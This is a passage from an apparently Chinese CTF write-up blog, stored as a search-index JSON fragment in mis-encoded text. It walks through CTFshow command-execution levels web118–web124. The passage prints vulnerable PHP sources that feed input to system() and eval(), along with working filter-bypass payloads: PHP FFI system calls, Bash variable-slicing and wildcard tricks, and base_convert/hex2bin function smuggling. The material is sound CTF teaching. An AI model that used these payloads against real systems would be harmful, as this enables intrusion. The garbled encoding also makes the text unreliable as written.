PHP ä»£ç ç›´æ¥è°ƒç”¨ C è¯­è¨€å‡½æ•°ï¼Œä»è€Œå®ç°äº† PHP ä¸ C è¯­è¨€çš„é«˜æ•ˆäº¤äº’ã€‚è¿™ä¸º PHP å¼€å‘è€…æä¾›äº†ä¸€ç§åˆ©ç”¨ C è¯­è¨€çš„é«˜æ€§èƒ½å’Œåº•å±‚æ“ä½œç³»ç»ŸåŠŸèƒ½çš„æ–¹å¼ã€‚\npayload:\n$ffi = FFI::cdef(\u0026#34;int system(const char *command);\u0026#34;);//åˆ›å»ºä¸€ä¸ªsystemå¯¹è±¡\r$a=\u0026#39;/readflag \u0026gt; 1.txt\u0026#39;;//æ²¡æœ‰å›æ˜¾çš„\r$ffi-\u0026gt;system($a);//é€šè¿‡$ffiå»è°ƒç”¨systemå‡½æ•° é€šè¿‡æ‰§è¡Œç›®å½•ä¸­çš„ /readflag ç¨‹åºå¹¶å°†å…¶è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶ 1.txtä¸­ï¼ˆå› ä¸ºåªæ˜¯æ‰§è¡Œçš„è¯æ²¡æœ‰å›æ˜¾ï¼‰\næ‰§è¡Œä¸€ä¸‹\nçœ‹åˆ°æœ‰å›æ˜¾åº”è¯¥æ˜¯æˆåŠŸäº†ï¼Œè®¿é—®ä¸€ä¸‹1.txt\nç”±äºå½“å‰ç”¨æˆ·æƒé™ä¸è¶³æˆ‘ä»¬æ˜¯ä¸èƒ½ç›´æ¥è¯»flag36x.phpæ–‡ä»¶ä¸­çš„å†…å®¹çš„ï¼Œåªèƒ½é€šè¿‡readflagï¼ˆè„šæœ¬é‡Œé¢ä¼šè¿›è¡Œææƒï¼‰æ¥è¯»\nweb118 åŸæ–‡åœ°å€ï¼šhttps://blog.csdn.net/Myon5/article/details/140145005\nè¾“å…¥æ•°å­—å’Œå°å†™å­—æ¯ï¼Œå›æ˜¾ evil input\næŸ¥çœ‹æºç ï¼Œå‘ç°è¿™é‡Œä¼šå°†æäº¤çš„å‚æ•° code ä¼ ç»™ system å‡½æ•°\nä½¿ç”¨ burpsuite æŠ“åŒ…è¿›è¡Œå•ä¸ªå­—ç¬¦çš„æ¨¡ç³Šæµ‹è¯• fuzzï¼š\nå‘ç°è¿‡æ»¤æ‰äº†æ•°å­—å’Œå°å†™å­—æ¯ä»¥åŠä¸€äº›ç¬¦å·ï¼Œä¸‹é¢æ¡†èµ·æ¥çš„éƒ¨åˆ†æ˜¯å¯ç”¨çš„\nç»“åˆé¢˜ç›®æç¤ºï¼šflag åœ¨ flag.php\né‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ„é€ å‡ºå‘½ä»¤å»è¯»å– flag.php\næˆ‘ä»¬å…ˆæ¥äº†è§£ä¸€ä¸‹ Linux çš„å†…ç½®å˜é‡ åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œæœ‰è®¸å¤šå†…ç½®å˜é‡ï¼ˆç¯å¢ƒå˜é‡ï¼‰ç”¨äºé…ç½®ç³»ç»Ÿè¡Œä¸ºå’Œå­˜å‚¨ç³»ç»Ÿä¿¡æ¯ã€‚\nï¼ˆ1ï¼‰$BASH\næè¿°ï¼šæŒ‡å‘å½“å‰ä½¿ç”¨çš„Bashè§£é‡Šå™¨çš„è·¯å¾„ã€‚ ç¤ºä¾‹ï¼š/bin/bash ç”¨é€”ï¼šç”¨äºç¡®å®šæ­£åœ¨ä½¿ç”¨çš„Bashç‰ˆæœ¬å’Œè·¯å¾„ã€‚\nï¼ˆ2ï¼‰ $PATH\næè¿°ï¼šå­˜å‚¨ä¸€ç³»åˆ—è·¯å¾„ï¼Œè¿™äº›è·¯å¾„ç”¨äºæŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå½“ä½ åœ¨å‘½ä»¤è¡Œä¸­è¾“å…¥å‘½ä»¤æ—¶ï¼Œç³»ç»Ÿä¼šåœ¨è¿™äº›è·¯å¾„ä¸­æŸ¥æ‰¾å¯¹åº”çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚ ç¤ºä¾‹ï¼š/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ç”¨é€”ï¼šå½±å“å‘½ä»¤çš„æŸ¥æ‰¾å’Œæ‰§è¡Œï¼Œå¯ä»¥æ·»åŠ è‡ªå®šä¹‰è„šæœ¬æˆ–ç¨‹åºçš„è·¯å¾„ã€‚\nï¼ˆ3ï¼‰$HOME\næè¿°ï¼šå½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•è·¯å¾„ã€‚ ç¤ºä¾‹ï¼š/home/username ç”¨é€”ï¼šè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ï¼Œé€šå¸¸ç”¨äºå­˜å‚¨ç”¨æˆ·é…ç½®æ–‡ä»¶å’Œä¸ªäººæ•°æ®ã€‚\nï¼ˆ4ï¼‰$PWD\næè¿°ï¼šå½“å‰å·¥ä½œç›®å½•ï¼ˆPresent Working Directoryï¼‰ã€‚ ç¤ºä¾‹ï¼š/home/username/projects ç”¨é€”ï¼šè¡¨ç¤ºå½“å‰çš„å·¥ä½œç›®å½•è·¯å¾„ï¼Œå¸¸ç”¨äºè„šæœ¬å’Œå‘½ä»¤ä¸­è·å–æˆ–æ˜¾ç¤ºå½“å‰ç›®å½•ã€‚\nï¼ˆ5ï¼‰$USER\næè¿°ï¼šå½“å‰ç™»å½•çš„ç”¨æˆ·åã€‚ ç¤ºä¾‹ï¼šusername ç”¨é€”ï¼šè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„åç§°ï¼Œå¸¸ç”¨äºæ˜¾ç¤ºæˆ–æ£€æŸ¥ç”¨æˆ·ä¿¡æ¯ã€‚\nï¼ˆ6ï¼‰$SHELL\næè¿°ï¼šå½“å‰ç”¨æˆ·çš„é»˜è®¤shellã€‚ ç¤ºä¾‹ï¼š/bin/bash ç”¨é€”ï¼šè¡¨ç¤ºç”¨æˆ·ç™»å½•æ—¶ä½¿ç”¨çš„é»˜è®¤shellè·¯å¾„ã€‚\nï¼ˆ7ï¼‰$UID\næè¿°ï¼šå½“å‰ç”¨æˆ·çš„ç”¨æˆ·IDã€‚ ç¤ºä¾‹ï¼š1000ï¼ˆæ™®é€šç”¨æˆ·ï¼‰ï¼Œ0ï¼ˆrootç”¨æˆ·ï¼‰ ç”¨é€”ï¼šæ ‡è¯†å½“å‰ç”¨æˆ·çš„å”¯ä¸€IDã€‚\nï¼ˆ8ï¼‰$IFS\næè¿°ï¼šå†…éƒ¨å­—æ®µåˆ†éš”ç¬¦ï¼ˆInternal Field Separatorï¼‰ï¼Œç”¨äºåˆ†å‰²è¾“å…¥çš„å­—æ®µï¼Œé»˜è®¤ä¸ºç©ºæ ¼ã€åˆ¶è¡¨ç¬¦å’Œæ¢è¡Œç¬¦ã€‚ ç¤ºä¾‹ï¼šé»˜è®¤å€¼ä¸º ç”¨é€”ï¼šå½±å“è„šæœ¬ä¸­çš„å­—æ®µåˆ†å‰²ï¼Œå¸¸ç”¨äºå¤„ç†è¾“å…¥å’Œè§£ææ–‡æœ¬ã€‚\næ­¤å¤–è¿˜æœ‰å¾ˆå¤šçš„å†…ç½®å˜é‡ï¼š\næ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦çŸ¥é“ Bash å˜é‡çš„åˆ‡ç‰‡ï¼Œä¸ python çš„åˆ‡ç‰‡ç±»ä¼¼ï¼Œç›®çš„è¿˜æ˜¯ä»æŒ‡å®šä½ç½®å¼€å§‹æå–å­å­—ç¬¦ä¸²ï¼Œç”¨æ³•ï¼š${VAR:offset:length}ï¼Œçœ‹ä¾‹å­ï¼š\n${PWD:1:2} æå–ä»ç¬¬äºŒä¸ªå­—ç¬¦å¼€å§‹çš„ä¸¤ä¸ªå­—ç¬¦ï¼Œå³ roï¼Œåœ¨ Bash ä¸­ï¼Œå­—ç¬¦ä¸²åˆ‡ç‰‡çš„ç´¢å¼•ä¹Ÿæ˜¯ä» 0 å¼€å§‹çš„ã€‚\nå¦‚æœåªå¡«ä¸€ä¸ªå‚æ•°ï¼Œä¼šé»˜è®¤ä»æŒ‡å®šçš„ä½ç½®å¼€å§‹æå–åˆ°å­—ç¬¦ä¸²çš„æœ«å°¾ï¼š\n${PWD:3} ç®€å•æµ‹ä¸€ä¸‹æˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºæ³¢æµªå·çš„æ•ˆæœï¼šä»ç»“å°¾å¼€å§‹å–\nä½†æ˜¯è¿™é‡Œæ•°å­—è¢«è¿‡æ»¤äº†ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨å¤§å†™å­—æ¯ç»•è¿‡ï¼š\nå¯ä»¥å‘ç°ä»»æ„çš„å¤§å°å†™å­—æ¯ä¸æ•°å­— 0 ç­‰æ•ˆ\nä¸éš¾æƒ³åˆ°è¿™é‡Œçš„ $PWD åº”è¯¥æ˜¯ /var/www/htmlï¼ˆç½‘é¡µæœåŠ¡æ‰€åœ¨çš„å¸¸è§è·¯å¾„ï¼‰ï¼›\nè€Œ $PATH çš„ç»“å°¾åº”è¯¥ä¹Ÿæ˜¯ /binï¼ˆè¿™ä¸ªåœ¨å‰é¢æˆ‘ä»¬å·²ç»æµ‹è¯•è¿‡äº†ï¼‰ã€‚\nå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ å‡º nl å‘½ä»¤æ¥è¯»å– flag.phpï¼Œç”±äº ? å¯ç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¿›è¡Œé€šé…ï¼Œç»•è¿‡å­—æ¯çš„è¿‡æ»¤ï¼Œæ„é€  payloadï¼š\n${PATH:~Q}${PWD:~Q} ????.??? å½“ç„¶é¢˜ç›®è¿˜ç»™äº†å…¶ä»– payloadï¼š\n${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.??? åœ¨Bashä¸­ï¼Œ${#var} çš„è¯­æ³•ç”¨äºè·å–å˜é‡ var çš„é•¿åº¦ï¼ˆå³å­—ç¬¦æ•°ï¼‰ã€‚\nè¿™ç§å½¢å¼å¯ä»¥åº”ç”¨äºä»»ä½•å˜é‡ï¼Œæ— è®ºæ˜¯å­—ç¬¦ä¸²å˜é‡è¿˜æ˜¯ç¯å¢ƒå˜é‡ã€‚\næˆ‘ä»¬çŸ¥é“ ${HOME} æ˜¯ /rootï¼Œå› æ­¤ ${#HOME} å°±æ˜¯ 5ã€‚\nä»¥æ­¤ç±»æ¨ï¼Œæœ€ç»ˆå°†è¿™äº›æ•°å­—åº”ç”¨åˆ°åˆ‡ç‰‡ä¸­å»ï¼Œç»•è¿‡å¯¹æ•°å­—çš„è¿‡æ»¤ï¼Œæ„é€ å‡ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚\nWeb119 å…ˆç”¨ä¸Šä¸€é¢˜çš„payloadæ‰“äº†ä¸€ä¸‹ï¼Œæ˜¾ç¤ºevil input\næµ‹äº†ä¸€ä¸‹ä¸Šé¢˜ç”¨çš„PATHè¢«banäº†\næ¢ä¸ªæ–¹æ³•\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}??${HOME:${#HOSTNAME}:${#SHLVL}} ????.???\rç›¸å½“äº/???/??t ????.???\råŒ¹é…/bin/cat ????.??? ${#SHLVL}}=1\n${PWD::${#SHLVL}} = /\n${#HOSTNAME}=4 //ç”¨æˆ·åçš„ä½æ•°ï¼Œè¿™é‡Œç”¨æˆ·åæ˜¯rootï¼Œæ•…ä¸º4\nå¦ä¸€ç§æ–¹æ³•\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???\rç›¸å½“äº/???/?????4 ????.??? æˆ–è€… /???/?????5 ????.???\ræƒ³è¦åŒ¹é…/bin/base64 ????.??? {#RANDOM} = 4æˆ–5\nç”±äºå¯èƒ½æ˜¯5ï¼Œæ‰€ä»¥è¦å¤šè¯•å‡ æ¬¡ï¼Œè¿˜è¦è¿›è¡Œbase64è§£ç \nweb120 1 2\u0026lt;?php 3error_reporting(0); 4highlight_file(__FILE__); 5if(isset($_POST[\u0026#39;code\u0026#39;])){ 6 $code=$_POST[\u0026#39;code\u0026#39;]; 7 if(!preg_match(\u0026#39;/\\x09|\\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|\\!|\\=|\\^|\\*|\\x26|\\%|\\\u0026lt;|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\`|\\||\\,/\u0026#39;, $code)){ 8 if(strlen($code)\u0026gt;65){ 9 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.\u0026#39;you are so long , I dont like \u0026#39;.\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 10 } 11 else{ 12 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.system($code).\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 13 } 14 } 15 else{ 16 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;evil input\u0026lt;/div\u0026gt;\u0026#39;; 17 } 18} 19 20?\u0026gt; è¿™é¢˜æŠŠä¸Šé¢˜çš„HOMEä¹Ÿbanäº†ï¼Œä½†æ˜¯ç¬¬äºŒç§æ–¹æ³•è¿˜èƒ½å‡ºï¼Œè€Œä¸”é•¿åº¦ä¹Ÿç¬¦åˆ\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.??? æˆ–\n${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?${USER:~A}? ????.??? web121 1 2\u0026lt;?php 3error_reporting(0); 4highlight_file(__FILE__); 5if(isset($_POST[\u0026#39;code\u0026#39;])){ 6 $code=$_POST[\u0026#39;code\u0026#39;]; 7 if(!preg_match(\u0026#39;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|\\%|\\\u0026lt;|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\`|\\||\\,/\u0026#39;, $code)){ 8 if(strlen($code)\u0026gt;65){ 9 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.\u0026#39;you are so long , I dont like \u0026#39;.\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 10 } 11 else{ 12 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.system($code).\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 13 } 14 } 15 else{ 16 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;evil input\u0026lt;/div\u0026gt;\u0026#39;; 17 } 18} 19 20?\u0026gt; è¿™é¢˜SHLVLè¢«banäº†ï¼Œå¯ä»¥ç”¨?ä»£æ›¿\n${#?}=1\npayload\n${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.??? æˆ–\n${PWD::${#?}}???${PWD::${#?}}${PWD::${#?}}?? ????.???\r/bin/rev revæ˜¯å€’å™è¾“å‡ºçš„\nweb122 1 2\u0026lt;?php 3error_reporting(0); 4highlight_file(__FILE__); 5if(isset($_POST[\u0026#39;code\u0026#39;])){ 6 $code=$_POST[\u0026#39;code\u0026#39;]; 7 if(!preg_match(\u0026#39;/\\x09|\\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\\/|\\(|\\)|\\[|\\]|\\\\\\\\|\\+|\\-|_|~|\\!|\\=|\\^|\\*|\\x26|#|%|\\\u0026gt;|\\\u0026#39;|\\\u0026#34;|\\`|\\||\\,/\u0026#39;, $code)){ 8 if(strlen($code)\u0026gt;65){ 9 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.\u0026#39;you are so long , I dont like \u0026#39;.\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 10 } 11 else{ 12 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;\u0026#39;.system($code).\u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; 13 } 14 } 15 else{ 16 echo \u0026#39;\u0026lt;div align=\u0026#34;center\u0026#34;\u0026gt;evil input\u0026lt;/div\u0026gt;\u0026#39;; 17 } 18} 19 20?\u0026gt; è¿™é¢˜æŠŠPWDå’Œ#ä¹Ÿbanæ‰äº†\nå¯ä»¥è€ƒè™‘ç”¨$?æ¥ä»£æ›¿${#1}\n$?æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸0ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé0ä»£è¡¨æ‰§è¡Œæœ‰è¯¯\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payload:\n\u0026lt;A;${HOME::$?}???${HOME::$?}????${RANDOM::$?}? ????.??? \u0026lt;AæŒ‡ä»¤ä¸çŸ¥é“æ˜¯å•¥ï¼ŒåŸ‹ä¸ªå‘\nweb124 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: æ”¶é›†è‡ªç½‘ç»œ 6# @Date: 2020-09-16 11:25:09 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-10-06 14:04:45 9 10*/ 11 12error_reporting(0); 13//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag 14if(!isset($_GET[\u0026#39;c\u0026#39;])){ 15 show_source(__FILE__); 16}else{ 17 //ä¾‹å­ c=20-1 18 $content = $_GET[\u0026#39;c\u0026#39;]; 19 if (strlen($content) \u0026gt;= 80) { 20 die(\u0026#34;å¤ªé•¿äº†ä¸ä¼šç®—\u0026#34;); 21 } 22 $blacklist = [\u0026#39; \u0026#39;, \u0026#39;\\t\u0026#39;, \u0026#39;\\r\u0026#39;, \u0026#39;\\n\u0026#39;,\u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\\[\u0026#39;, \u0026#39;\\]\u0026#39;]; 23 foreach ($blacklist as $blackitem) { 24 if (preg_match(\u0026#39;/\u0026#39; . $blackitem . \u0026#39;/m\u0026#39;, $content)) { 25 die(\u0026#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦\u0026#34;); 26 } 27 } 28 //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp 29 $whitelist = [\u0026#39;abs\u0026#39;, \u0026#39;acos\u0026#39;, \u0026#39;acosh\u0026#39;, \u0026#39;asin\u0026#39;, \u0026#39;asinh\u0026#39;, \u0026#39;atan2\u0026#39;, \u0026#39;atan\u0026#39;, \u0026#39;atanh\u0026#39;, \u0026#39;base_convert\u0026#39;, \u0026#39;bindec\u0026#39;, \u0026#39;ceil\u0026#39;, \u0026#39;cos\u0026#39;, \u0026#39;cosh\u0026#39;, \u0026#39;decbin\u0026#39;, \u0026#39;dechex\u0026#39;, \u0026#39;decoct\u0026#39;, \u0026#39;deg2rad\u0026#39;, \u0026#39;exp\u0026#39;, \u0026#39;expm1\u0026#39;, \u0026#39;floor\u0026#39;, \u0026#39;fmod\u0026#39;, \u0026#39;getrandmax\u0026#39;, \u0026#39;hexdec\u0026#39;, \u0026#39;hypot\u0026#39;, \u0026#39;is_finite\u0026#39;, \u0026#39;is_infinite\u0026#39;, \u0026#39;is_nan\u0026#39;, \u0026#39;lcg_value\u0026#39;, \u0026#39;log10\u0026#39;, \u0026#39;log1p\u0026#39;, \u0026#39;log\u0026#39;, \u0026#39;max\u0026#39;, \u0026#39;min\u0026#39;, \u0026#39;mt_getrandmax\u0026#39;, \u0026#39;mt_rand\u0026#39;, \u0026#39;mt_srand\u0026#39;, \u0026#39;octdec\u0026#39;, \u0026#39;pi\u0026#39;, \u0026#39;pow\u0026#39;, \u0026#39;rad2deg\u0026#39;, \u0026#39;rand\u0026#39;, \u0026#39;round\u0026#39;, \u0026#39;sin\u0026#39;, \u0026#39;sinh\u0026#39;, \u0026#39;sqrt\u0026#39;, \u0026#39;srand\u0026#39;, \u0026#39;tan\u0026#39;, \u0026#39;tanh\u0026#39;]; 30 preg_match_all(\u0026#39;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/\u0026#39;, $content, $used_funcs); 31 foreach ($used_funcs[0] as $func) { 32 if (!in_array($func, $whitelist)) { 33 die(\u0026#34;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°\u0026#34;); 34 } 35 } 36 //å¸®ä½ ç®—å‡ºç­”æ¡ˆ 37 eval(\u0026#39;echo \u0026#39;.$content.\u0026#39;;\u0026#39;); 38} è¿™é¢˜è®¾ç½®äº†ç™½åå•å’Œé»‘åå•ï¼Œç™½åå•æ˜¯æ•°å­¦å‡½æ•°ï¼Œé»‘åå•åˆ™æ˜¯ä¸€äº›ç¬¦å·ï¼Œè€Œä¸”æœ‰é•¿åº¦é™åˆ¶\nè¿™é¢˜çš„æ€è·¯å…¶å®å°±æ˜¯è¦è€ƒè™‘ç”¨æ•°å­—é€šè¿‡æ•°å­¦è¿ç®—å‡½æ•°çš„è½¬æ¢æ¥æ„é€ å‡ºæˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„å­—ç¬¦\nå°±æ¯”å¦‚æˆ‘ä»¬å¯ä»¥å…ˆå°†éœ€è¦çš„å­—ç¬¦è½¬æ¢æˆ16è¿›åˆ¶åå†è½¬æ¢æˆ10è¿›åˆ¶ï¼Œå†æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™é€šè¿‡æ•°å­¦å‡½æ•°è½¬æ¢å›å»\nCTFshow-WEBå…¥é—¨-å‘½ä»¤æ‰§è¡Œweb124 - Hacker\u0026amp;Cat - åšå®¢å›­\nç›®æ ‡ä»£ç ï¼š$_GET[\u0026#39;abs\u0026#39;]($_GET[\u0026#39;acos\u0026#39;]) dechex()ï¼Œ10è¿›åˆ¶è½¬16è¿›åˆ¶\rbase_convert(å€¼,åŸè¿›åˆ¶,ç›®æ ‡è¿›åˆ¶)ï¼Œä»»æ„è¿›åˆ¶è½¬æ¢\rhex2binï¼Œ16è¿›åˆ¶è½¬å­—ç¬¦ä¸² è§£é¢˜ï¼š\nbase_convert(26941962055,10,34) ä¸º hex2bin\nbase_convert(26941962055,10,34)(dechex(1598506324)) ä¸º _GET\næ„é€ payload\nc=$pi=base_convert(26941962055,10,34)(dechex(1598506324));$$pi{abs}($$pi{asin})\u0026amp;abs=system\u0026amp;asin=ls ","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","summary":"\u003ch4 id=\"web29\"\u003eweb29\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-php\" data-lang=\"php\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e\u0026lt;?\u003c/span\u003e\u003cspan class=\"nx\"\u003ephp\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# -*- coding: utf-8 -*-\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @Author: h1xa\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @Date:   2020-09-04 00:12:34\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @Last Modified by:   h1xa\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @Last Modified time: 2020-09-04 00:26:48\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 9\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @email: h1xa@ctfer.com\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e10\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e# @link: https://ctfer.com\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e11\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e12\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e*/\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e13\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e14\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003eerror_reporting\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e15\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eisset\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;c\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e])){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e16\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003e$c\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;c\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e17\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nx\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/flag/i\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e)){\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e18\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003eeval\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$c\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e19\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan 